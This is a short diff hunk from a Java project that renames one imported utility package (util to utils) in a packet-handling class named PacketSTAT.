@@ -3,7 +3,7 @@ package com.redpois0n.packets;
 import com.redpois0n.Slave;
 import com.redpois0n.Status;
 import com.redpois0n.ui.frames.Frame;
-import com.redpois0n.util.Util;
+import com.redpois0n.utils.Util;
 
 public class PacketSTAT extends Packet {
 
